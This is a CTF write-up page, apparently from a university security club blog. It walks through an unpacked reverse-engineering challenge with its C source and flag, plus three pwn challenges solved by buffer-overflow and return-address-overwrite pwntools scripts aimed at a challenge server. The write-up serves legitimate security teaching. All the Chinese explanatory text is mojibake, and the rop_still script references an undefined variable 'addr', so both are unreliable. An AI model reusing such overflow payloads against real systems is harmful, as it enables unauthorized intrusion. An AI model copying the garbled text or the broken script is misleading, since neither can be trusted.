<p>æ‰”è¿›idaä¹Ÿçœ‹ä¸å‡ºæ¥å•¥ï¼Œè€ƒè™‘åˆ°é€†å‘åˆ†ç±»ï¼Œå¤§æ¦‚ç‡æ˜¯åŠ å£³ï¼Œæœ€å¸¸è§çš„å°±æ˜¯upxå£³ï¼Œlinuxä¸‹ä½¿ç”¨upxå·¥å…·è§£å¼€å³å¯å¾—åˆ°ç¨‹åº</p>
<p>çœ‹èµ·æ¥å¾ˆå¤šï¼Œå…¶å®å¾ˆå®¹æ˜“å°±èƒ½æ‰¾åˆ°å…³é”®å‡½æ•°ï¼ˆæ²¡åŠæ³•ï¼Œä¸åˆ°40kbä¸èƒ½upxåŠ å£³ï¼Œåªèƒ½é™æ€ç¼–è¯‘äº†</p>
<p>ä½†æ˜¯æ ¹æ®mainå‡½æ•°èµ°äº†ä¸€éï¼Œå•¥ä¹Ÿæ²¡æœ‰ï¼Œç»§ç»­å¯»æ‰¾å¯ä»¥å‘ç°è¿˜æœ‰ä¸€ä¸ªæœ‰å‡½æ•°åçš„å‡½æ•°ä»æ¥æ²¡æœ‰è°ƒç”¨è¿‡ï¼Œæ‰“å¼€ä¸€çœ‹ï¼Œæ˜¯è¾“å…¥å’Œåˆ¤å®šï¼Œæ¨æµ‹è¿™å°±æ˜¯flagéªŒè¯å‡½æ•°ã€‚</p>
<p>ç¨‹åºé€»è¾‘æ˜¯æ ¹æ®å¥‡å¶åˆ†åˆ«è¿›è¡ŒåŠ å¯†</p>
<p>é€†å‘ç®—æ³•ä¹Ÿå¾ˆç®€å•ï¼Œè§£å¼€å³å¯get flag</p>
<p>è¿™é‡Œä¹Ÿé™„ä¸€ä¸ªæºç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check1</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check2</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check3</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">flag</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">There</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="keyword">char</span> Flag[] = <span class="string">"flag is not here"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"I'll ask you some math questions, plz give me your answer.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"660 * x + 795 == 742 mod 2009\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">    <span class="keyword">if</span>(check1(x) == <span class="number">0</span>) <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"What is the twenty-five prime number?\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">    <span class="keyword">if</span>(check2(x) == <span class="number">0</span>) <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Answer to the Ultimate Question of Life, the Universe, and Everything?\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">    <span class="keyword">if</span>(check3(x) == <span class="number">0</span>) <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    flag();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check1</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="number">660</span>*x+<span class="number">795</span>)%<span class="number">2009</span> != <span class="number">742</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong answer!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check2</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x != <span class="number">97</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong answer!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check3</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x != <span class="number">42</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong answer!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Wow, You solved all the problems!\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"But I have to say...\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s :P\n"</span>, Flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> f[] = <span class="string">"egbbxr3r\\tLp\\b0o\\mf\\o,zZEgbb~"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">There</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> b[<span class="number">30</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, b);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">29</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">            b[i] = b[i]^<span class="number">0x3</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            b[i] = b[i] - <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">29</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(f[i] != b[i])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Wrong!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag{w0w_yOu_g3t_real1y_Flag}</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="overflow-still"><a href="#overflow-still" class="headerlink" title="overflow_still"></a>overflow_still</h3><p>â€‹        ä»é¢˜ç›®å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™è¿˜æ˜¯ä¸€ä¸ªoverflowçš„é¢˜ç›®ã€‚</p>
<p>â€‹        åœ¨Ubuntuç»ˆç«¯æ‰§è¡Œå‘½ä»¤æ¥è¿œç¨‹è¿è¡Œç¨‹åºã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 121.41.113.245 10001</span><br></pre></td></tr></table></figure>

<p>â€‹        ELFæ–‡ä»¶ä¸¢å…¥IDAåˆ†æï¼Œåœ¨å·¦ä¾§å‡½æ•°çª—å£å¯ä»¥æ‰¾åˆ°ä¸¤ä¸ªä¸»è¦å‡½æ•°ï¼š</p>
<p>â€‹        main():<img src="https://s1.ax1x.com/2020/06/01/t8sHsI.png" alt="t8sHsI.png"></p>
<p>â€‹        func():<img src="https://s1.ax1x.com/2020/06/01/t8sBiF.png" alt="t8sBiF.png"></p>
<p>â€‹        ç¨‹åºçš„é€»è¾‘æ˜¯ï¼Œåªè¦a1çš„å€¼ç­‰äº0xcafebabeå°±èƒ½æ‹¿åˆ°flagã€‚ä½†æ˜¯ç¨‹åºæ­£å¸¸æµç¨‹ä¸­æ²¡æœ‰ä¿®æ”¹a1çš„åœ°æ–¹ã€‚</p>
<p>â€‹        ä¸è¿‡æ‰¾åˆ°äº†ä¸€ä¸ªæº¢å‡ºç‚¹å°±æ˜¯gets()ã€‚è¿™ä¸ªå‡½æ•°ç”¨èµ·æ¥è™½ç„¶æ–¹ä¾¿ï¼Œä½†æ˜¯å¹¶ä¸å¯¹äºè¾“å…¥é•¿åº¦è¿›è¡Œæ£€æŸ¥ï¼Œå› æ­¤å®¹æ˜“äº§ç”Ÿæº¢å‡ºï¼Œæ¯”è¾ƒå±é™©ã€‚</p>
<p>â€‹        åœ¨så˜é‡å£°æ˜ä»£ç æ—è¾¹çš„æ³¨é‡Šå¯ä»¥æ‰¾åˆ°[ebp-28h]ï¼Œè¯´æ˜sè·ç¦»æ ˆåº•0x28å­—èŠ‚ï¼Œå†å°†å…‰æ ‡æ”¾åœ¨a1ä¸Š:</p>
<p><img src="https://s1.ax1x.com/2020/06/01/t8swIU.png" alt="t8swIU.png"></p>
<p>â€‹        æ‰€ä»¥æ€è·¯å°±æ˜¯ï¼šå¯¹så˜é‡è¿›è¡Œæº¢å‡ºï¼Œè¦†ç›–æ‰a1ï¼Œè®©å®ƒç­‰äº0xcafebabeã€‚è€Œæº¢å‡ºçš„é‡é€šè¿‡è®¡ç®—å¾—ï¼š-0x28-0x8=0x30</p>
<p>â€‹        è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"121.41.113.245"</span>,<span class="number">10001</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x30</span>+p32(<span class="number">0xcafebabe</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="rop-still"><a href="#rop-still" class="headerlink" title="rop_still"></a>rop_still</h3><p>â€‹        åˆä¸€ä¸ªropï¼Œç»å¯¹çš„åŸºç¡€çŸ¥è¯†ğŸ˜‚ã€‚</p>
<p>â€‹        åœ¨Ubuntuç»ˆç«¯æ‰§è¡Œå‘½ä»¤æ¥è¿œç¨‹è¿è¡Œç¨‹åºã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 121.41.113.245 10002</span><br></pre></td></tr></table></figure>

<p>â€‹        ELFæ–‡ä»¶ä¸¢å…¥IDAåˆ†æï¼Œåœ¨å·¦ä¾§å‡½æ•°çª—å£å¯ä»¥æ‰¾åˆ°ä¸‰ä¸ªä¸»è¦å‡½æ•°ï¼Œ</p>
<p>â€‹        main()ï¼š<a href="https://imgchr.com/i/t8s5Je" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/06/01/t8s5Je.png" alt="t8s5Je.png"></a></p>
<p>â€‹        nothing()ï¼š<img src="https://s1.ax1x.com/2020/06/01/t8sIRH.png" alt="t8sIRH.png"></p>
<p>â€‹        what_is_this()ï¼š<img src="https://s1.ax1x.com/2020/06/01/t8sozd.png" alt="t8sozd.png"></p>
<p>â€‹        å‘ç°systemåé—¨å‡½æ•°åœ¨what_is_this()ä¸­ï¼Œè€Œå¦å¤–ä¸¤ä¸ªå‡½æ•°çš„æ­£å¸¸æ‰§è¡Œæµç¨‹æ˜¯ä¸ä¼šè°ƒç”¨åˆ°è¿™ä¸ªå‡½æ•°çš„ã€‚</p>
<p>â€‹        å†æ£€æŸ¥æœ‰æ²¡æœ‰å…¶ä»–æ¼æ´ç‚¹ï¼Œå‘ç°nothingä¸­ï¼Œå¯¹bufå˜é‡çš„è¯»å…¥ä¼šå‘ç”Ÿæº¢å‡ºã€‚</p>
<p>â€‹        å’Œä¸Šä¸ªæœˆçš„jokeä¸€æ ·ï¼Œåˆ©ç”¨åˆ°äº†æ ˆå¸§çš„åŸºç¡€çŸ¥è¯†ï¼Œå¯¹å±€éƒ¨å˜é‡è¿›è¡Œæº¢å‡ºï¼Œè¦†ç›–å‡½æ•°è¿”å›åœ°å€ã€‚</p>
<p>â€‹        æŸ¥çœ‹bufå˜é‡å³è¾¹çš„æ³¨é‡Šå¯ä»¥çœ‹åˆ°[ebp-38h]ï¼Œä¹Ÿå°±æ˜¯è¯´bufå˜é‡è·ç¦»æ ˆåº•0x38å­—èŠ‚ï¼Œè€Œåœ¨æ ˆå¸§ä¸Šï¼Œæ ˆåº•å¾€ä¸‹çš„ç¬¬ä¸€ä¸ªåœ°å€æ˜¯ç”¨æ¥å­˜æ—§çš„ebpçš„ï¼Œæ ˆåº•å¾€ä¸‹ç¬¬äºŒä¸ªåœ°å€å­˜çš„å°±æ˜¯è¿”å›åœ°å€ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦æº¢å‡ºçš„åœ°å€ã€‚</p>
<p><img src="https://s1.ax1x.com/2020/06/01/t8s7QA.png" alt="t8s7QA.png"></p>
<p>â€‹        å› ä¸ºreadå‡½æ•°å…è®¸è¯»å…¥0x200ä¸ªå­—èŠ‚ï¼Œé•¿åº¦è¶³å¤Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨0x38ä¸ªâ€™aâ€™å¡«æ»¡bufï¼Œç”¨p32(0)å¡«æ»¡æ—§ebpï¼Œå†ç”¨what_is_this()çš„åœ°å€å¡«å……åŸæ¥çš„è¿”å›åœ°å€ï¼Œè¿™æ ·nothingå‡½æ•°æ‰§è¡Œç»“æŸåï¼Œç³»ç»Ÿå°±ä¼šè·³è½¬åˆ°what_is_thiså¼€å§‹æ‰§è¡Œã€‚</p>
<p>â€‹        è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"121.41.113.245"</span>,<span class="number">10002</span>)</span><br><span class="line">elf = ELF(<span class="string">'./rop_still'</span>)</span><br><span class="line">what_addr = <span class="number">0x08048562</span></span><br><span class="line">p.recvuntil(<span class="string">"Not thing here..."</span>)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0x38</span>+p32(<span class="number">0</span>)+p32(addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h3><p>â€‹        åœ¨Ubuntuç»ˆç«¯æ‰§è¡Œå‘½ä»¤æ¥è¿œç¨‹è¿è¡Œç¨‹åºã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 121.41.113.245 10000</span><br></pre></td></tr></table></figure>

<p>â€‹        å‘ç°è²Œä¼¼æ˜¯ä¸€ä¸ªçŒœæ•°å­—çš„ç¨‹åºã€‚</p>
<p><a href="https://imgchr.com/i/t8srRJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/06/01/t8srRJ.png" alt="t8srRJ.png"></a></p>
<p>â€‹        ä¸¢idaåˆ†æä¸€æ³¢ã€‚ä¸»è¦å‡½æ•°åªæœ‰mainå‡½æ•°ã€‚</p>
<p><img src="https://s1.ax1x.com/2020/06/01/t8ssz9.png" alt="t8ssz9.png"></p>
<p>â€‹        åœ¨ç¨‹åºä¸­å¯ä»¥çœ‹åˆ°ï¼Œv8å˜é‡æ˜¯ç”¨éšæœºæ•°å‡½æ•°rand()å‡½æ•°ç”Ÿæˆçš„ï¼Œæ¯æ¬¡çš„å€¼éƒ½ä¸ä¸€æ ·ã€‚</p>
<p>â€‹        æ­¤å¤„è¦æ³¨æ„<a href="https://www.cnblogs.com/guihailiuli/p/4154416.html" target="_blank" rel="noopener">ä¼ªéšæœºæ•°çš„çŸ¥è¯†</a>ã€‚</p>
<p>â€‹        å¤§è‡´çš„æ„æ€æ˜¯ï¼Œsrand()å’Œrand()å‡½æ•°å¯ä»¥é…åˆä½¿ç”¨ç”Ÿæˆéšæœºæ•°ï¼Œrand()ç”¨æ¥è¿”å›ç”Ÿæˆçš„å€¼ã€‚rand()å‡½æ•°è™½ç„¶èƒ½äº§ç”Ÿéšæœºæ•°ï¼Œä½†æ˜¯æ˜¯é€šè¿‡srandçš„å‚æ•°seedç»è¿‡ä¸€å®šç®—æ³•å¾—å‡ºæ¥çš„ã€‚æ¢å¥è¯è¯´ï¼Œåœ¨å‡½æ•°ç®—æ³•ä¸å˜çš„å‰æä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨åŒæ ·çš„å‚æ•°seedï¼Œå°±å¯ä»¥å¾—å‡ºåŒæ ·çš„éšæœºæ•°ã€‚</p>
<p><img src="https://s1.ax1x.com/2020/06/01/t8s6MR.png" alt="t8s6MR.png"></p>
<p>â€‹        åŒæ ·çš„è‡ªå˜é‡ï¼ŒåŒæ ·çš„å‡½æ•°ï¼Œå°±ä¼šå¾—å‡ºåŒæ ·çš„å› å˜é‡ã€‚</p>
<p>â€‹        æ‰€ä»¥srand()å‡½æ•°ä¸å˜çš„å‰æä¸‹ï¼Œæˆ‘ä»¬åªéœ€è¦æ”¹å˜seedçš„å€¼å°±å¯ä»¥æ§åˆ¶æœ€ç»ˆå¾—å‡ºçš„éšæœºæ•°ã€‚</p>
<p>â€‹        åœ¨ç¨‹åºä¸­æˆ‘ä»¬çœ‹åˆ°srand()çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯seedï¼Œç”¨çš„æ˜¯a[0]ï¼Œè€Œa[0]åœ¨mainå‡½æ•°ç¬¬12è¡Œå¤„è¢«ä¸€ä¸ªæœªåˆå§‹åŒ–çš„å˜é‡èµ‹å€¼è¿‡ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¯ä¸ªä¸ç¡®å®šçš„å€¼ã€‚æˆ‘ä»¬è¦åšçš„å°±æ˜¯è¦†å†™è¿™ä¸ªa[0]ã€‚</p>
<p>â€‹        æˆ‘ä»¬å‡è®¾a[0]ç­‰äº1ï¼Œå†æ±‚å‡ºæ¥ç”Ÿæˆçš„éšæœºæ•°æ˜¯å¤šå°‘ã€‚</p>
<p>â€‹        å†™ä¸ªCç¨‹åºç”¨srandå‡½æ•°ç®—ä¸€ç®—ï¼š</p>
<p><img src="https://s1.ax1x.com/2020/06/01/t8sWdK.png" alt="t8sWdK.png"></p>
<p><a href="https://imgchr.com/i/t8sfIO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/06/01/t8sfIO.png" alt="t8sfIO.png"></a></p>
<p>â€‹        seedç­‰äº1æ˜¯ï¼Œrand()%100å¾—å‡ºçš„ç»“æœä¸º83ã€‚</p>
<p>â€‹        åŒå‡»aå˜é‡ï¼Œå‘ç°å®ƒä½äºç¨‹åºçš„bssæ®µï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ã€‚</p>
<p>!<img src="https://s1.ax1x.com/2020/06/01/t8scs1.png" alt="t8scs1.png"></p>
<p>â€‹        è€Œåœ¨å®ƒä¸Šæ–¹æœ‰å¦ä¸€ä¸ªå…¨å±€å˜é‡bï¼Œè¿™ä¸ªå˜é‡åœ¨mainå‡½æ•°ä¸­è¢«ç”¨æ¥è¾“å…¥å§“åã€‚</p>
<p><img src="https://s1.ax1x.com/2020/06/01/t8sgqx.png" alt="t8sgqx.png"></p>
<p>â€‹        æˆ‘ä»¬å¯ä»¥ç”¨readå‡½æ•°å¡«å……bå˜é‡ï¼Œæº¢å‡ºåˆ°aï¼Œè¦†ç›–a[0]ä¸º1ã€‚</p>
<p><img src="https://s1.ax1x.com/2020/06/01/t8sRZ6.png" alt="t8sRZ6.png"></p>
<p>â€‹        bçš„åœ°å€ä¸ºï¼š0x08049B4Cï¼Œaçš„åœ°å€ä¸ºï¼š0x08049B60ã€‚è®¡ç®—å¯çŸ¥ï¼Œä¸¤è€…ç›¸è·0x14å­—èŠ‚ã€‚</p>
<p>â€‹        è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"121.41.113.245"</span>,<span class="number">10000</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x14</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'First tell me who you are : \n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'Do you know what I am thinking?\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">83</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>






    </div>

    
    
    
        <div class="reward-container">
  <div>Donate comment here.</div>
  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
    Donate
  </button>
  <div id="qr" style="display: none;">

  </div>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              
                 <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
              
                 <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
              
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/04/16/introduction/" rel="prev" title="æ­¦æ±‰ç§‘æŠ€å¤§å­¦ä¿¡æ¯å®‰å…¨åä¼š">
      <i class="fa fa-chevron-left"></i> æ­¦æ±‰ç§‘æŠ€å¤§å­¦ä¿¡æ¯å®‰å…¨åä¼š
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/01/30/s1rone_wp/" rel="next" title="WUSTå†…éƒ¨èµ›wp">
      WUSTå†…éƒ¨èµ›wp <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ç­¾åˆ°é¢˜"><span class="nav-number">1.1.</span> <span class="nav-text">ç­¾åˆ°é¢˜</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#æˆ‘å·²å¤‡ä»½å¥½æ–‡ä»¶"><span class="nav-number">1.2.</span> <span class="nav-text">æˆ‘å·²å¤‡ä»½å¥½æ–‡ä»¶</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#æœ‰ç‚¹åƒç”œé¥¼"><span class="nav-number">1.3.</span> <span class="nav-text">æœ‰ç‚¹åƒç”œé¥¼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easyweb"><span class="nav-number">1.4.</span> <span class="nav-text">easyweb</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#è¿˜æ˜¯å†™é¢˜çˆ½"><span class="nav-number">2.1.</span> <span class="nav-text">è¿˜æ˜¯å†™é¢˜çˆ½</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cry"><span class="nav-number">2.2.</span> <span class="nav-text">Cry</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRYPTO"><span class="nav-number">3.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Are-u-okï¼Ÿ"><span class="nav-number">3.1.</span> <span class="nav-text">Are u okï¼Ÿ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#be-r"><span class="nav-number">3.2.</span> <span class="nav-text">be@r</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE"><span class="nav-number">4.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#maze"><span class="nav-number">4.1.</span> <span class="nav-text">maze</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezbabyre"><span class="nav-number">4.2.</span> <span class="nav-text">ezbabyre</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">5.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#overflow-still"><span class="nav-number">5.1.</span> <span class="nav-text">overflow_still</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rop-still"><span class="nav-number">5.2.</span> <span class="nav-text">rop_still</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#guess"><span class="nav-number">5.3.</span> <span class="nav-text">guess</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="WUST-AIS"
      src="/uploads/logo.png">
  <p class="site-author-name" itemprop="name">WUST-AIS</p>
  <div class="site-description" itemprop="description">Join us</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">8</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
